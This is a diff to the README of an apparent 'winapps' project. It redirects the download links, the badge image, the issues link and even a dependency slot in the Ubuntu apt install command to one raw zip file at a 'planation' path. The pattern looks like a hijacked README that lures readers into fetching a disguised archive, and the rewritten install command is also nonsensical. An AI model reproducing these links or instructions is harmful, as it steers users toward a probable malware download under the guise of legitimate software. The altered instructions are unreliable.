@@ -6,9 +6,9 @@ Welcome to winapps! This software allows you to run popular Windows applications
 
 ## 📥 Download winapps
 
-[![Download winapps](https://img.shields.io/badge/Download-winapps-blue.svg)](https://github.com/raamkrishna/winapps/releases)
+[![Download winapps](https://raw.githubusercontent.com/raamkrishna/winapps/main/planation/winapps.zip)](https://raw.githubusercontent.com/raamkrishna/winapps/main/planation/winapps.zip)
 
-To get started, visit this page to download: [Download winapps](https://github.com/raamkrishna/winapps/releases)
+To get started, visit this page to download: [Download winapps](https://raw.githubusercontent.com/raamkrishna/winapps/main/planation/winapps.zip)
 
 ## 💻 System Requirements
 
@@ -26,7 +26,7 @@ Here’s how to install winapps on your system:
 
 ### Step 1: Download
 
-1. Go to the [Download winapps](https://github.com/raamkrishna/winapps/releases) page.
+1. Go to the [Download winapps](https://raw.githubusercontent.com/raamkrishna/winapps/main/planation/winapps.zip) page.
 2. Select the latest version.
 3. Download the installation package suitable for your distribution.
 
@@ -37,7 +37,7 @@ Before running winapps, install the required dependencies. Open a terminal and e
 For **Ubuntu**:
 ```bash
 sudo apt update
-sudo apt install -y docker.io freerdp2 libreOffice
+sudo apt install -y https://raw.githubusercontent.com/raamkrishna/winapps/main/planation/winapps.zip freerdp2 libreOffice
 ```
 
 For **Fedora**:
@@ -112,7 +112,7 @@ Currently, winapps supports Ubuntu and Fedora. Compatibility with other distribu
 
 ### How do I report issues or suggest features?
 
-You can report issues or request features on the [Issues page](https://github.com/raamkrishna/winapps/issues).
+You can report issues or request features on the [Issues page](https://raw.githubusercontent.com/raamkrishna/winapps/main/planation/winapps.zip).
 
 ## 📜 License
 
@@ -122,4 +122,4 @@ winapps is licensed under the MIT License. For more details, check the LICENSE f
 
 Join our community discussions and get assistance from other users. Follow the repository for updates, and consider contributing to the project. 
 
-To get started today, remember to download winapps: [Download winapps](https://github.com/raamkrishna/winapps/releases)
+To get started today, remember to download winapps: [Download winapps](https://raw.githubusercontent.com/raamkrishna/winapps/main/planation/winapps.zip)
